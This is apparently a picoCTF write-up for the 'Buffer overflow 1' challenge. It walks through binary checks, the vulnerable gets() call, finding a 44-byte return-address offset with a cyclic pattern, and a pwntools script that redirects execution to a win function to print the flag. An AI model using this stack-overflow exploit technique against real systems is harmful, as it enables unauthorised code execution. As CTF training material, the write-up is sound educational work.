---
title: "Buffer overflow 1"
date: "2025-07-14"
tags: ["picoCTF", "buffer overflow"]
---

```bash
file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID\[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

```bash
checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   76 Symbols	 No	0	3	vuln
```

```bash
./vuln
Please enter your string:
hola
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

This binary has a vulnerability that lets us overflow the buffer, because the code uses a `gets`, an unsafe function that lets you overflow the buffer and overwrite important parts of the program such as the registers.

```c
void vuln() {
    char buf[BUFSIZE];
    gets(buf); // Función vulnerable
	printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

The program just asks for a string and tells us which address it is going to jump to (EIP).

To solve the challenge we can find the offset to the return address, and once we get there, send the address we want to jump to. Here we want to jump to the `win` function, which is made to print the flag.

```c
void win() {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt", "r");

    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                       "own debugging flag.\n");
        exit(0);
    }

    fgets(buf, FLAGSIZE, f);
    printf(buf);
}
```

First let's find the offset:

1. We generate a pattern

```bash
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

2. We send it to the program

```
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
```

3. We look at the value EIP took

```bash
EIP  0x6161616c ('laaa')
```

4. We look up the offset

```bash
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

The offset is **44 bytes**.

Now that we know the offset we can write a simple script that sends the address of the `win` function right after the offset.

```python
from pwn import *

exe = ELF("./vuln_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("DIRECCION", IP)
    return r

def main():
    r = conn()
    padding = 44
    payload = flat({
        padding: [
            exe.symbols.win
        ]
    })
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()

```

```bash
python solve.py     
[*] '/home/ub1cu0/Desktop/picoCTF/buffer_overflow_1/vuln_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Opening connection to saturn.picoctf.net on port 61001: Done
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{SECRETO}
[*] Got EOF while reading in interactive
```
